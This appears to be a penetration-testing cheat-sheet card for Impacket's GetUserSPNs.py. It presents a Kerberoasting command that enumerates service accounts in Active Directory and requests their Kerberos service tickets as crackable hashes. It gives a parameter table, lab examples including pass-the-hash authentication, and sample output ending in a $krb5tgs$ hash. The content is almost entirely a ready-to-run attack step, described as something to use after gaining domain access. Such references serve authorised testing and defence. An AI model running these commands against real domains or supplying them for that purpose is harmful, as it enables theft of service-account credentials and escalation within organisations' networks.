---
type: command
executor: bash
data: >-
  GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile
  spn_hashes.txt
tags:
  - enumeration
  - kerberos
platforms:
  - Linux
verified: true
validated: true
---

# impacket-getuserspns-request

## Command

```bash
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile spn_hashes.txt
```

## Description

This Impacket command enumerates Service Principal Names (SPNs) via LDAP and requests TGS tickets for each, outputting crackable Kerberos hashes. Use after initial domain access to identify roastable service accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| DOMAIN/USER:PASSWORD | Domain credentials (or NTLM hash as DOMAIN/USER:HASH) | Yes |
| -dc-ip DC_IP | IP of Domain Controller | Yes |
| -request | Flag to request TGS tickets | Yes |
| -outputfile spn_hashes.txt | Save hashes to file | No |

## Examples

### Basic Usage

```bash
GetUserSPNs.py lab.local/svcacct:Pass123 -dc-ip 10.10.10.10 -request
```

### With Hash

```bash
GetUserSPNs.py lab.local/svcacct:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.10.10.10 -request
```

## Expected Output

Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon
--------------------  ----  --------  ---------------  ---------
lab/MSSQLSvc:1433     svc_mssql  CN=SQL Admins,...  2020-01-15  ...  ...

$krb5tgs$23$*svc_mssql$LAB.LOCAL$MSSQLSvc/dc01.lab.local:1433*$<hash>

## Related

- [[procedures/Kerberoasting-with-Rubeus]]
- [[tools/Impacket]]
